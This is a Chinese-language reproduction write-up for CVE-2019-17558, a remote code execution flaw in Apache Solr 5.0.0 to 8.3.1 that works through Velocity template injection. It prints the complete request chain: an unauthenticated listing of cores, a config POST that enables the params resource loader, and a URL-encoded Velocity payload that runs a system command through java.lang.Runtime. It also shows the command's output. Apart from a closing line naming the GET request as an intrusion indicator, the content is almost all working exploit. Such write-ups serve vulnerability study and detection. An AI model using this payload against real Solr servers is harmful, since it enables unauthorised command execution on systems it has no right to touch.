# CVE-2019-17558

## 概述 

Apache Solr 是一个开源的搜索服务器。

在其 5.0.0 到 8.3.1版本中，用户可以注入自定义模板，通过Velocity模板语言执行任意命令。

攻击者通过未授权访问solr服务器，发送特定的数据包开启params.resource.loader.enabled，然后get访问接口导致服务器命令执行。


## 复现

查看 all cores:

http://ip:8983/solr/admin/cores?indexInfo=false&wt=json

	{
	  "responseHeader":{
	    "status":0,
	    "QTime":0},
	  "initFailures":{},
	  "status":{
	    "demo":{
	      "name":"demo",
	      "instanceDir":"/var/solr/data/demo",
	      "dataDir":"/var/solr/data/demo/data/",
	      "config":"solrconfig.xml",
	      "schema":"managed-schema",
	      "startTime":"2020-11-02T08:54:31.126Z",
	      "uptime":46243}}}

默认情况下params.resource.loader.enabled配置未打开，无法使用自定义模板。

通过如下请求开启params.resource.loader.enabled，其中API路径包含刚才获取的core名称：

	POST /solr/demo/config HTTP/1.1
	Host: solr:8983
	Content-Type: application/json
	Content-Length: 259
	
	{
	  "update-queryresponsewriter": {
	    "startup": "lazy",
	    "name": "velocity",
	    "class": "solr.VelocityResponseWriter",
	    "template.base.dir": "",
	    "solr.resource.loader.enabled": "true",
	    "params.resource.loader.enabled": "true"
	  }
	}

执行命令主要在后面的get请求：

	http://your-ip:8983/solr/demo/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end

response：

	HTTP/1.1 200 OK
	Content-Type: text/html;charset=utf-8
	Content-Length: 56
	
	     0  uid=8983(solr) gid=8983(solr) groups=8983(solr)

入侵指标以后面的get请求为准。

![](1.png)